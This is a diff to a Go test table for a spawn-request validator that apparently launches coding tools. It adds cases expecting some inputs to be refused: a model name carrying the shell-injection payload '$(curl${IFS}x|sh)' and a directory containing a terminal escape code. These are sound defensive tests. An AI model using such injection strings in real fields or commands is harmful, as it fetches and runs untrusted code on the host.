@@ -94,6 +94,7 @@ func TestSpawn(t *testing.T) {
 		refused bool
 	}{
 		{"defaults", am.SpawnRequest{Directory: dir}, false},
+		{"model with brackets", am.SpawnRequest{Directory: dir, Model: "opus[1m]", Effort: "xhigh"}, false},
 		{"full", am.SpawnRequest{Name: " fix-login ", Tool: "opencode", Group: "backend/api", Directory: dir, Worktree: true, Prompt: "Go\r\n", Model: "opus", Effort: "high"}, false},
 		{"hidden tool", am.SpawnRequest{Tool: "codex", Directory: dir}, true},
 		{"relative directory", am.SpawnRequest{Directory: "src"}, true},
@@ -101,6 +102,8 @@ func TestSpawn(t *testing.T) {
 		{"unknown group", am.SpawnRequest{Directory: dir, Group: "nope"}, true},
 		{"long name", am.SpawnRequest{Directory: dir, Name: strings.Repeat("n", 81)}, true},
 		{"model with spaces", am.SpawnRequest{Directory: dir, Model: "opus --flag"}, true},
+		{"model with shell syntax", am.SpawnRequest{Directory: dir, Model: "$(curl${IFS}x|sh)"}, true},
+		{"directory with an escape code", am.SpawnRequest{Directory: dir + "\x1b[2J"}, true},
 		{"control characters in prompt", am.SpawnRequest{Directory: dir, Prompt: "a\x1b[201~b"}, true},
 	}
 	for _, tt := range tests {
